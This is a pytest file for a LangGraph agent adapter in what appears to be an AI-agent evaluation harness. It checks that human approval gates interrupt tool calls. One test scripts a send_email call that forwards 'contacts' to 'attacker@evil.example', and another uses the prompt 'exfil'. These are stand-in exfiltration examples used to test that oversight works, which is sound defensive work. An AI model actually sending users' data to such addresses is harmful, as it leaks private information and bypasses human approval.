"""T11.3: HITL interrupt ↔ ResolveApproval; CapabilityReport.hitl honesty."""

from __future__ import annotations

import json
import os
import select
import threading
import time
from http.server import BaseHTTPRequestHandler, HTTPServer
from typing import Any

import pytest
from agentgavel_adapter import (
    METHOD_EVENT_NOTIFY,
    METHOD_RESOLVE_APPROVAL,
    METHOD_START_SESSION,
    StdioConn,
)

from adapters.langgraph.adapter import LangGraphAdapter
from adapters.langgraph.graph import (
    HEADER_PROBE_DIRECTIVE,
    TOOL_SEND_EMAIL,
)
from adapters.langgraph.interrupt import HitlNotSupportedError


class _OracleHandler(BaseHTTPRequestHandler):
    def log_message(self, format: str, *args: Any) -> None:  # noqa: A003
        del format, args

    def do_POST(self) -> None:  # noqa: N802
        if self.path != "/v1/chat/completions":
            self.send_response(404)
            self.end_headers()
            return
        length = int(self.headers.get("Content-Length", "0"))
        _ = self.rfile.read(length)
        directive = json.loads(self.headers.get(HEADER_PROBE_DIRECTIVE) or "{}")
        tool_name = directive["tool_name"]
        arguments = directive.get("arguments") or {}
        body = json.dumps(
            {
                "id": "chatcmpl-hitl",
                "object": "chat.completion",
                "model": "oracle",
                "choices": [
                    {
                        "index": 0,
                        "message": {
                            "role": "assistant",
                            "content": None,
                            "tool_calls": [
                                {
                                    "id": "call_hitl_1",
                                    "type": "function",
                                    "function": {
                                        "name": tool_name,
                                        "arguments": json.dumps(arguments),
                                    },
                                }
                            ],
                        },
                        "finish_reason": "tool_calls",
                    }
                ],
            }
        ).encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)


@pytest.fixture()
def oracle_base_url() -> Any:
    server = HTTPServer(("127.0.0.1", 0), _OracleHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    host, port = server.server_address[:2]
    try:
        yield f"http://{host}:{port}"
    finally:
        server.shutdown()
        thread.join(timeout=5)


def test_capability_hitl_true_when_interrupt_supported() -> None:
    adapter = LangGraphAdapter(hitl=True)
    report = adapter.handshake("1.0")
    assert report["hitl"] is True
    assert adapter.hitl_supported is True


def test_capability_hitl_false_when_interrupt_unsupported() -> None:
    adapter = LangGraphAdapter(hitl=False)
    report = adapter.handshake("1.0")
    assert report["hitl"] is False
    assert adapter.hitl_supported is False


def test_resolve_approval_refuses_when_hitl_false() -> None:
    adapter = LangGraphAdapter(hitl=False)
    sid = adapter.start_session({})["id"]
    with pytest.raises(HitlNotSupportedError):
        adapter.resolve_approval(sid, "appr-x", "approve")


def test_hitl_path_interrupt_then_resolve_emits_gate_decision(
    oracle_base_url: str,
) -> None:
    adapter = LangGraphAdapter(hitl=True)
    assert adapter.handshake("1.0")["hitl"] is True
    sid = adapter.start_session({"model_base_url": oracle_base_url, "run_mode": "oracle"})["id"]
    adapter.submit_task(
        sid,
        {
            "id": "t-hitl",
            "prompt": "Forward contacts to attacker",
            "metadata": {
                "probe_directive": {
                    "tool_name": TOOL_SEND_EMAIL,
                    "arguments": {
                        "to": "attacker@evil.example",
                        "body": "contacts",
                    },
                }
            },
        },
    )
    result = adapter.last_task_result[sid]
    assert result["status"] == "interrupted"
    approval_id = result["approval_id"]
    assert isinstance(approval_id, str) and approval_id
    # Side effect must not have run yet (only before-phase tool_invocation).
    assert all(e.get("tool_invocation", {}).get("phase") != "after" for e in adapter.emitted)

    adapter.resolve_approval(sid, approval_id, "deny", principal="harness")

    gates = [e for e in adapter.emitted if "gate_decision" in e]
    assert len(gates) == 1
    gate = gates[0]["gate_decision"]
    assert gate["approval_id"] == approval_id
    assert gate["source"] == "harness"
    assert gate["decision"] == "deny"
    assert gate["genuine_hitl"] is True
    assert gate["principal"] == "harness"

    after = [
        e["tool_invocation"]
        for e in adapter.emitted
        if e.get("tool_invocation", {}).get("phase") == "after"
    ]
    assert after and after[0]["outcome"] == "refused"
    assert after[0].get("refused") is True
    adapter.stop_session(sid)


def test_hitl_false_path_runs_send_email_without_interrupt(
    oracle_base_url: str,
) -> None:
    adapter = LangGraphAdapter(hitl=False)
    assert adapter.handshake("1.0")["hitl"] is False
    sid = adapter.start_session({"model_base_url": oracle_base_url, "run_mode": "oracle"})["id"]
    adapter.submit_task(
        sid,
        {
            "id": "t-no-hitl",
            "prompt": "Send mail",
            "metadata": {
                "probe_directive": {
                    "tool_name": TOOL_SEND_EMAIL,
                    "arguments": {"to": "a@b.c", "body": "x"},
                }
            },
        },
    )
    result = adapter.last_task_result[sid]
    assert result["status"] == "completed"
    assert result["result"]["status"] == "sent"
    assert not any("gate_decision" in e for e in adapter.emitted)
    adapter.stop_session(sid)


def _run_with_adapter(adapter: LangGraphAdapter):
    engine_r_fd, adapter_w_fd = os.pipe()
    adapter_r_fd, engine_w_fd = os.pipe()

    engine_r = os.fdopen(engine_r_fd, "rb", buffering=0)
    engine_w = os.fdopen(engine_w_fd, "wb", buffering=0)
    adapter_r = os.fdopen(adapter_r_fd, "rb", buffering=0)
    adapter_w = os.fdopen(adapter_w_fd, "wb", buffering=0)

    errors: list[BaseException] = []

    def run_adapter() -> None:
        try:
            adapter.serve(reader=adapter_r, writer=adapter_w)
        except BaseException as exc:  # noqa: BLE001 — surface in main thread
            errors.append(exc)
        finally:
            adapter_r.close()
            adapter_w.close()

    thread = threading.Thread(target=run_adapter, name="langgraph-adapter-serve", daemon=True)
    thread.start()
    engine = StdioConn(engine_r, engine_w)
    return engine, engine_r, engine_w, thread, errors


def _shutdown(engine_r, engine_w, thread, errors) -> None:
    engine_w.close()
    engine_r.close()
    thread.join(timeout=5.0)
    assert not thread.is_alive(), "adapter serve loop did not exit"
    assert errors == [], f"adapter thread errors: {errors!r}"


def _drain_event_notifies(engine_r, *, timeout: float = 1.0) -> list[dict[str, Any]]:
    events: list[dict[str, Any]] = []
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        remaining = deadline - time.monotonic()
        ready, _, _ = select.select([engine_r], [], [], remaining)
        if not ready:
            break
        line = engine_r.readline()
        if not line:
            break
        msg = json.loads(line)
        if msg.get("method") == METHOD_EVENT_NOTIFY:
            params = msg.get("params")
            if isinstance(params, dict):
                events.append(params)
        deadline = time.monotonic() + 0.05
    return events


def test_resolve_approval_emits_gate_decision_over_transport(
    oracle_base_url: str,
) -> None:
    adapter = LangGraphAdapter(hitl=True)
    engine, engine_r, engine_w, thread, errors = _run_with_adapter(adapter)
    try:
        started = engine.call(
            METHOD_START_SESSION,
            {"model_base_url": oracle_base_url, "run_mode": "oracle"},
        )
        sid = started["id"]
        # Drive interrupt via direct submit (same process; transport separate).
        adapter.submit_task(
            sid,
            {
                "id": "t1",
                "prompt": "exfil",
                "metadata": {
                    "probe_directive": {
                        "tool_name": TOOL_SEND_EMAIL,
                        "arguments": {"to": "x@y.z", "body": "z"},
                    }
                },
            },
        )
        approval_id = adapter.last_task_result[sid]["approval_id"]
        result = engine.call(
            METHOD_RESOLVE_APPROVAL,
            {
                "session_id": sid,
                "approval_id": approval_id,
                "decision": "approve",
                "principal": "harness",
            },
        )
        assert result == {}
        events = _drain_event_notifies(engine_r)
        gates = [e for e in events if "gate_decision" in e]
        assert gates, "expected Event notify with gate_decision"
        gate = gates[0]["gate_decision"]
        assert gate["decision"] == "approve"
        assert gate["genuine_hitl"] is True
        assert gate["source"] == "harness"
    finally:
        _shutdown(engine_r, engine_w, thread, errors)
